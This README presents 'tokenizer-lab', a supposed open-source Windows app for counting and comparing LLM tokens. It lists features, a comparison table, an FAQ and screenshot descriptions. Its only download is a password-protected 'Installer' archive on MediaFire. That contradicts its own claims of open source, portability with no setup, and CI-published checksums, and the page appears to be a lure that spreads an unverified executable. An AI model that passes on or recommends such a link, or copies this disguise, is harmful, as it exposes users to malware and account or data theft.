# tokenizer-lab

🔡 Free, open-source tokenizer playground for Windows — tokenize text like any GGUF model, count tokens, compare two. 100 MB offline MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Loads real tokenizers** — reads tokenizer config from GGUF headers or Hugging Face folders, no approximations
- ✅ **Color token view** — text broken into tokens with boundary markers so odd splits are visible instantly
- ✅ **Token and cost count** — character, word and token totals with a per-million-token cost field
- ✅ **Two-tokenizer compare** — same text side by side across two models to see who wastes context
- ✅ **Special token map** — BOS, EOS and control tokens listed with their ids and rendered forms
- ✅ **File batch mode** — drop a folder of texts and get a token-count table for every file
- ✅ **100 MB self-contained exe** — runtime and tokenizer backend bundled, portable, offline, MIT

## Why tokenizer-lab

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **tokenizer-lab** | tiktoken web | HF tokenizers | Online counters |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free web | Free, OSS | Free web |
| Open source | **Yes** | Yes | Yes | No |
| Reads GGUF tokenizer config | **Yes** | No | No | No |
| Two-tokenizer compare | **Yes** | No | No | Rare
| Folder batch counting | **Yes** | No | Scripted | No
| Portable, no install | **Yes, 100 MB** | Browser | Python env | Browser

## FAQ

**how many tokens is my text? count tokens for local LLM models**

Online counters usually run one public tokenizer, so counts drift on Llama or Mistral vocabularies by double digits. tokenizer-lab reads the actual tokenizer config out of your GGUF file and counts with it. It is a 100 MB portable exe, MIT, offline — drop a folder in and compare models side by side.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark token view (#121418, orange #FB923C): text pane with colored token blocks, count bar reading 187 tokens and 412 characters, tokenizer dropdown showing Llama-3.
2. Compare mode: two columns tokenizing the same paragraph, counts 187 versus 203 highlighted, delta chip reading 8 percent fewer tokens on the left.
3. Special token table: BOS and EOS rows with ids, rendered forms and byte notes, filter field, footer chip reading tokenizer loaded from model.gguf.

## Download

| Source | Link |
|---|---|
| 💾 **Installer tokenizer-lab** | [Installer tokenizer-lab](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).